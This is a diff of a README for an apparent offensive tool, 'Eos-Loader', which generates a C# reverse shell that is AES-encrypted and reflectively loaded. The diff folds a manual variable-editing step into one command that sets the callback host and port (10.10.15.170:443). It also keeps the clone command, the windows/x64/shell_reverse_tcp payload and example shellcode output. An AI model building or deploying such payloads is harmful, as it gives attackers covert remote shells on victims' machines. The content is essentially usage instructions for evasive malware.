@@ -5,19 +5,9 @@ Python loader to write a csharp AES reflectively loaded reverse shell.
 ```sh
 git clone https://github.com/ZumiYumi/Eos-Loader
 ```
-## 2. Modify Variables
+## 2. Run Loader and Compile
 ```sh
-cd Eos-Loader; nano Eos-Loader.py # based nano user
-
-# Replace and modify below as needed
-# LHOST = "10.10.15.170"
-# LPORT = 443
-# PAYLOAD = "windows/x64/shell_reverse_tcp"
-```
-
-## 3. Run Loader and Compile
-```sh
-python Eos-Loader.py
+python Eos-Loader.py --lhost 10.10.15.170 --lport 443
 
 # EXAMPLE OUTPUT
 # [+] Raw shellcode size: 460 bytes.
